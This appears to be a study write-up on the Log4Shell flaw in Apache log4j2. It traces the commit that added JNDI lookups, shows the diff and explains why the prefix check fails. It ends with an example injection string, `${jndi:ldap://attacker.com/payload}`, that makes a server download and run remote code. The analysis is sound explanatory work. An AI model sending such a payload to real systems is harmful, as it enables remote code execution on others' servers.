# Log4shell

About the incident: [Wikibedia Log4shell](https://en.wikipedia.org/wiki/Log4Shell)   
Vulnerabily description CVE-2021-44228: [NVD](https://nvd.nist.gov/vuln/detail/cve-2021-44228), [cvedetails](https://www.cvedetails.com/cve/CVE-2021-44228/)  
Jira ticket that cause the problem:  [Jira Ticket](https://issues.apache.org/jira/browse/LOG4J2-313)   
Oficial github repository: [logging-log4j2](https://github.com/apache/logging-log4j2#)



### Find the problem in the code
1. The problem was created by JNDI in the first place added in the log4j. To figure out when and where it happened I ran those commands: 


```bash
git clone git@github.com:apache/logging-log4j2.git
git log --oneline --grep="JNDI" # Found the first commit
git show --stat f1a0cac60f # Get more details about it
git describe --contains f1a0cac60f1e41347c9bced7c1470be488840344 # Find release (log4j-2.0-beta9~278)
git show f1a0cac60f1e41347c9bced7c1470be488840344 #Get all code

git diff f1a0cac^ f1a0cac -- **/Interpolator.java **/JndiLookup.java # See added code in this commit
```

```diff
@@ -63,6 +63,7 @@ public class Interpolator implements StrLookup {
         this.defaultLookup = new MapLookup(new HashMap<String, String>());
         lookups.put("sys", new SystemPropertiesLookup());
         lookups.put("env", new EnvironmentLookup());
+        lookups.put("jndi", new JndiLookup());
     }
     
     
@@ -0,0 +1,78 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one or more
+ * contributor license agreements. See the NOTICE file distributed with
+ * this work for additional information regarding copyright ownership.
+ * The ASF licenses this file to You under the Apache license, Version 2.0
+ * (the "License"); you may not use this file except in compliance with
+ * the License. You may obtain a copy of the License at
+ *
+ *      http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the license for the specific language governing permissions and
+ * limitations under the license.
+ */
+package org.apache.logging.log4j.core.lookup;
+
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+import org.apache.logging.log4j.core.LogEvent;
+import org.apache.logging.log4j.core.config.plugins.Plugin;
+
+/**
+ * Looks up keys from JNDI resources.
+ */
+@Plugin(name = "jndi", category = "Lookup")
+public class JndiLookup implements StrLookup {
+
+    /** JNDI resourcce path prefix used in a J2EE container */
+    static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = "java:comp/env/";
+
+    /**
+     * Get the value of the JNDI resource.
+     * @param key  the JNDI resource name to be looked up, may be null
+     * @return The value of the JNDI resource.
+     */
+    @Override
+    public String lookup(final String key) {
+        return lookup(null, key);
+    }
+
+    /**
+     * Get the value of the JNDI resource.
+     * @param event The current LogEvent (is ignored by this StrLookup).
+     * @param key  the JNDI resource name to be looked up, may be null
+     * @return The value of the JNDI resource.
+     */
+    @Override
+    public String lookup(final LogEvent event, final String key) {
+        if (key == null) {
+            return null;
+        }
+
+        try {
+            InitialContext ctx = new InitialContext();
+            return (String) ctx.lookup(convertJndiName(key));
+        } catch (NamingException e) {
+            return null;
+        }
+    }
+
+    /**
+     * Convert the given JNDI name to the actual JNDI name to use.
+     * Default implementation applies the "java:comp/env/" prefix
+     * unless other scheme like "java:" is given.
+     * @param jndiName The name of the resource.
+     * @return The fully qualified name to look up.
+     */
+    private String convertJndiName(String jndiName) {
+        if (!jndiName.startsWith(CONTAINER_JNDI_RESOURCE_PATH_PREFIX) && jndiName.indexOf(':') == -1) {
+            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;
+        }
+
+        return jndiName;
+    }
+}
```

### Explain this code: 
1. The `Interpolator` class acts as a central proxy for all `StrLookup` implementations, combining them within the Logger. `StrLookup` itself is an interface—defined in `src/main/java/org/apache/logging/log4j/core/lookup/StrLookup.java` that provides a `lookup(LogEvent event, String key)` method to map specific keys to string values. By adding the new `JndiLookup` class to this system, the developers integrated JNDI capabilities directly into the `Interpolator` framework. 
2. Why did they want to do that? ([Jira Ticket](https://issues.apache.org/jira/browse/LOG4J2-313)) 
	1. **Automation vs. Manual Coding**
		Previously, separating logs for multiple websites required custom code in every application to route data to the correct folders. JNDI automated this by allowing the logger to pull identity variables directly from the server environment, enabling a single configuration to work across all apps without manual boilerplate.
	2. **Global Persistence Across Threads**
		Older "Thread Context" methods were fragile; background threads often lost their logging metadata, resulting in mislabeled or missing logs. Since JNDI is a global server variable, it remains persistent across all threads, ensuring that even complex, multi-threaded tasks are always correctly routed to the proper log destination.

### The Problem with the Code:

**1. Failed Sanitization (`convertJndiName`)**
```java
private String convertJndiName(String jndiName) {
    if (!jndiName.startsWith(CONTAINER_JNDI_RESOURCE_PATH_PREFIX) && jndiName.indexOf(':') == -1) {
        jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;
    }
    return jndiName;
}
```
Here it only checks if a prefix is present, and if not just add `java:`. 

**2. Unrestricted Execution (`InitialContext`)**
```java
try {
    InitialContext ctx = new InitialContext();
    return (String) ctx.lookup(convertJndiName(key));
}
```
The unmodified string is passed directly into `InitialContext.lookup()`. This method does not verify or restrict protocols. It inherently trusts the input and will automatically resolve remote network paths.

### The Exploit Result:
Because of these two flaws working together, an attacker can input a string like `${jndi:ldap://attacker.com/payload}`. The system bypasses the local prefix check (seeing the colon in `ldap:`), and `InitialContext` connects to the attacker's server. The targeted server then automatically downloads and executes the remote, malicious Java class, resulting in full **Remote Code Execution (RCE)**.